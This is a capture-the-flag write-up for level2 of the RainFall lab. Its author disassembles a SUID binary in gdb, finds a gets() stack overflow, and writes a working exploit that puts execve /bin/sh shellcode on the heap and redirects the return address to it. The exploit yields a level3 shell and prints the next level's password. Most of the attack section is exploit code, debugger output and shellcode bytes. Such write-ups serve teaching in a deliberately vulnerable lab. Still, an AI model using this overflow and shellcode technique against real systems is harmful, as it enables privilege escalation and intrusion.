Login as `level2`.
```shell
┌──$ [~/42/2022/rainfall]
└─>  ssh 192.168.1.28 -p 4242 -l level2
level2@192.168.1.28's password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
```
A `SUID` executable is located in the home directory.
```shell
level2@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
```
Print all defined functions.
```gdb
level2@RainFall:~$ gdb ./level2
(gdb) info functions
[...]
0x080484d4  p
0x0804853f  main
[...]
```
`p()` gets a line from a stream `+25` and save a copy of a string on heap `+100`.
```gdb
(gdb) disassemble p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
End of assembler dump.
(gdb) break *p+105
Breakpoint 1 at 0x804853d
```
Run executable with recognizable pattern to fill array.
```gdb
(gdb) run <<< $(python -c "print 'A' * 64")
Starting program: /home/user/level2/level2 <<< $(python -c "print 'A' * 64")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJ����

Breakpoint 1, 0x0804853d in p ()
(gdb) x/32wx $esp
0xbffff6c0:	0xbffff6dc	0x00000000	0x00000000	0xb7e5ec73
0xbffff6d0:	0x080482b5	0x00000000	0x00c30000	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x0804854a
0xbffff720:	0xb7fed280	0x00000000	0xbffff738	0x0804854a
0xbffff730:	0x08048550	0x00000000	0x00000000	0xb7e454d3
```
Determine HEAP address and check that string was copied into.
```gdb
(gdb) info proc mappings
process 3338
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
	 0x804a000  0x806b000    0x21000        0x0 [heap]
	0xb7e2b000 0xb7e2c000     0x1000        0x0
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0
	0xb7fd9000 0xb7fdd000     0x4000        0x0
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) x/32wx 0x804a000
0x804a000:	0x00000000	0x00000051	0x41414141	0x41414141
0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a040:	0x41414141	0x41414141	0x0804854a	0xb7fed280
0x804a050:	0x00000000	0x00020fb1	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
```
As NX is disabled, put a shellcode on HEAP and overwrite EIP so that it holds HEAPs address. 
```gdb
(gdb) info frame
Stack level 0, frame at 0xbffff730:
 eip = 0x804853d in p; saved eip 0x804854a
 called by frame at 0xbffff740
 Arglist at 0xbffff728, args:
 Locals at 0xbffff728, Previous frame's sp is 0xbffff730
 Saved registers:
  ebp at 0xbffff728, eip at 0xbffff72c
```
At this point in time, it might be easier to use someone else shellcode. So, referring to shell codes database for study cases, choose a simple one [811](http://shell-storm.org/shellcode/files/shellcode-811.php).

Exploit and log on to the next level.
```shell
level2@RainFall:~$ (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmm' + '\x08\xa0\x04\x08'"; cat -)  | ./level2
1�Ph//shh/bin����°
                   ̀1�@̀aaaabbbbccccddddeeeeffffgggghhhhiiikkkkllllmmm�
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
